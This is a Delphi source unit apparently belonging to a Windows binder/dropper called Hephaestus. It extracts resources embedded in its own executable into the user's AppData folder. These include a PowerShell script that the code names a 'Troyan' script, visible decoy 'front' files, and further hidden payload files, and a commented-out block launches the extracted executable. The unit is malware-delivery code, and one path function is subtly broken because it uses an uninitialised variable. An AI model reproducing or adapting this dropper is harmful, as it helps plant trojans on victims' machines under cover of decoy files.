unit embeddingsMan;

interface

uses
  Windows, SysUtils, Classes, ShellAPI, ShlObj, _front, _embeddings;

procedure ListResources;

function GetTroyanPSScrypt: string;

var FrontFiles: TStringList;
var EmbedFiles: TStringList;

implementation


var
 g_front: integer =0;
 g_embed: integer =0;


function GetTroyanPSScrypt: string;
var
  AppDataPath: array[0..MAX_PATH] of Char;
  HephaestusPath: string;
  ScriptName: string;
begin
  if not SHGetSpecialFolderPath(0, AppDataPath, CSIDL_APPDATA, False) then
    RaiseLastOSError;

  HephaestusPath := IncludeTrailingPathDelimiter(StrPas(HephaestusPath)) + 'Hephaestus';

  if not DirectoryExists(HephaestusPath) then
    if not CreateDir(HephaestusPath) then
      RaiseLastOSError;

  ScriptName := 'body.ps1';

  Result := IncludeTrailingPathDelimiter(HephaestusPath) + ScriptName;
end;


function TempFile(name: string): string;
var
  AppDataPath: array[0..MAX_PATH] of Char;
  HephaestusPath: string;
begin
  if not SHGetSpecialFolderPath(0, AppDataPath, CSIDL_APPDATA, False) then
    RaiseLastOSError;

  HephaestusPath := IncludeTrailingPathDelimiter(StrPas(AppDataPath)) + 'Hephaestus';

  if not DirectoryExists(HephaestusPath) then
    if not CreateDir(HephaestusPath) then
      RaiseLastOSError;

  Result := IncludeTrailingPathDelimiter(HephaestusPath) + name;
end;

 {if pBuffer <> nil then
          begin
            FileName := TempFile(xembeddings[g_idx]);
            FileStream := TFileStream.Create(FileName, fmCreate);
            try
              FileStream.WriteBuffer(pBuffer^, ResourceSize);
            finally
              FileStream.Free;
            end;
            vis := xfront[g_idx];
            // Run the extracted executable
            ExecuteBatchFile(FileName, vis);
          end;}

function EnumNamesFunc(hModule: HMODULE; lpType, lpName: PChar; lParam: LPARAM): BOOL; stdcall;
var
  hResInfo: HRSRC;
  hGlobal: integer;
  pBuffer: Pointer;
  ResourceSize: DWORD;
  FileName: string;
  FileStream: TFileStream;
  vis: boolean;
  lpIndex: integer;
begin
  vis   := False;
  Result := True; // Continue enumeration by default
  try
    // Load the resource
    hResInfo := FindResource(hModule, lpName, lpType);
    if hResInfo <> 0 then
    begin
      ResourceSize := SizeofResource(hModule, hResInfo);
      if ResourceSize > 0 then
      begin
        hGlobal := LoadResource(hModule, hResInfo);
        if hGlobal <> 0 then
        begin
          pBuffer := LockResource(hGlobal);
          if pBuffer <> nil then
          begin
            try
              lpIndex := Integer(lpName);
              if (lpIndex = 7000) then
              begin
                if (FileExists(GetTroyanPSScrypt)) then
                begin
                   exit;
                end else
                begin
                  FileName := GetTroyanPSScrypt;
                end;
              end else
              if ((lpIndex >= 8000) and (lpIndex <= 8100))then
              begin
                vis := True;
                FileName := TempFile(_front.xembeddings[g_front]);
                FrontFiles.Add(FileName);
                g_front := g_front +1;
              end else
              if ((lpIndex >= 9000) and (lpIndex <= 9100)) then
              begin
                vis := True;
                FileName := TempFile(_embeddings.xembeddings[g_embed]);
                EmbedFiles.Add(FileName);
                g_embed := g_embed +1;
              end else
              begin
                exit;
              end;
              FileStream := TFileStream.Create(FileName, fmCreate);
              try
                FileStream.WriteBuffer(pBuffer^, ResourceSize);
                WriteLn('Extracted resource: ', FileName);
              finally
                FileStream.Free;
              end;
            finally
              // Unlock the resource explicitly, although it's not necessary in modern Windows versions
              // UnlockResource(hGlobal); // Not necessary in Windows XP and later
            end;
          end;
          // No need to explicitly free the resource in modern Windows
          // FreeResource(hGlobal); // Deprecated in modern Windows versions
        end;
      end;
    end;
  except
    on E: Exception do
    begin
      // Handle or log the exception
      WriteLn('Error: ', E.Message);
      Result := False; // Optionally stop enumeration on error
    end;
  end;
end;

function EnumTypesFunc(hModule: HMODULE; lpszType: PChar; lParam: LPARAM): BOOL; stdcall;
begin
  if not EnumResourceNames(hModule, lpszType, @EnumNamesFunc, lParam) then
    RaiseLastOSError;
  Result := True;
end;


procedure ListResources;
var
  hModule: integer;
begin
  FrontFiles := TStringList.Create();
  EmbedFiles := TStringList.Create();

  hModule := LoadLibraryEx(PChar(ParamStr(0)), 0, LOAD_LIBRARY_AS_DATAFILE);
  if hModule = 0 then
  begin
    WriteLn('Failed to load executable as data file.');
    Exit;
  end;

  EnumResourceTypes(hModule, @EnumTypesFunc, 0);

  FreeLibrary(hModule);
end;


end.
